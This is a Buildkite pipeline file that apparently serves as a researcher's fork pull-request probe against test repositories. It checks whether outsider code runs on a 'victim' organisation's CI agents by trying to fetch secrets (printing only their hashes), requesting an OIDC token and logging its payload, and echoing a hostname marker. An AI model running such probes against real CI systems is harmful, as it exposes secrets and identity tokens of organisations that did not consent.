# Outsider probe: `.buildkite/pipeline.yml` on branch `main` of the FORK
# ali-dev-test/bk-forktest, opened as PR #1 into ali-dev-test-2/bk-forktest:main.
# ali-dev-test is NOT a member of bk-tb-victim and NOT a collaborator on the base repo.
# If this file's commands run in the victim org's cluster, outsider code executed there.
# `$$` is Buildkite's escape for a literal `$` at runtime.
steps:
  - label: ":fork: outsider fork-event probe"
    agents:
      queue: cp-v4
    command: |
      set +e
      echo "########## identity ##########"
      echo "OUTSIDER_PROBE_REV=[FEP-1]"
      echo "BRANCH=[$$BUILDKITE_BRANCH] PIPELINE=[$$BUILDKITE_PIPELINE_SLUG] ORG=[$$BUILDKITE_ORGANIZATION_SLUG]"
      echo "PR=[$$BUILDKITE_PULL_REQUEST] BASE=[$$BUILDKITE_PULL_REQUEST_BASE_BRANCH] PRREPO=[$$BUILDKITE_PULL_REQUEST_REPO]"
      echo "SOURCE=[$$BUILDKITE_SOURCE] REPO=[$$BUILDKITE_REPO] COMMIT=[$$BUILDKITE_COMMIT]"
      echo "GH_EVENT=[$$BUILDKITE_GITHUB_EVENT] GH_ACTION=[$$BUILDKITE_GITHUB_ACTION]"
      echo "CREATOR=[$$BUILDKITE_BUILD_CREATOR] AUTHOR=[$$BUILDKITE_BUILD_AUTHOR]"
      echo "HEAD=[$$(git rev-parse HEAD 2>/dev/null || echo NOCHECKOUT)]"
      echo "HEADFILE=[$$(head -c 40 .buildkite/pipeline.yml 2>/dev/null | tr '\n' ' ')]"
      echo "JOBTOKENLEN=[$${#BUILDKITE_AGENT_ACCESS_TOKEN}]"

      echo "########## secrets ##########"
      if V=$$(buildkite-agent secret get FORKEVT 2>/dev/null); then
        echo "FORKEVT_SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
      else
        echo "FORKEVT_SECRET_DENIED"
      fi
      if V=$$(buildkite-agent secret get FORKEVTMAIN 2>/dev/null); then
        echo "FORKEVTMAIN_SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
      else
        echo "FORKEVTMAIN_SECRET_DENIED"
      fi

      echo "########## OIDC ##########"
      T=$$(buildkite-agent oidc request-token --audience forkevt-oidc --lifetime 120 2>/dev/null)
      if [ -n "$$T" ]; then echo "OIDC_PAYLOAD $$(printf %s "$$T" | cut -d. -f2)"; else echo "OIDC none"; fi

      echo "########## marker ##########"
      echo "OUTSIDER_CODE_EXECUTED_ON_VICTIM_AGENT [$$(hostname)]"
      echo "########## done ##########"
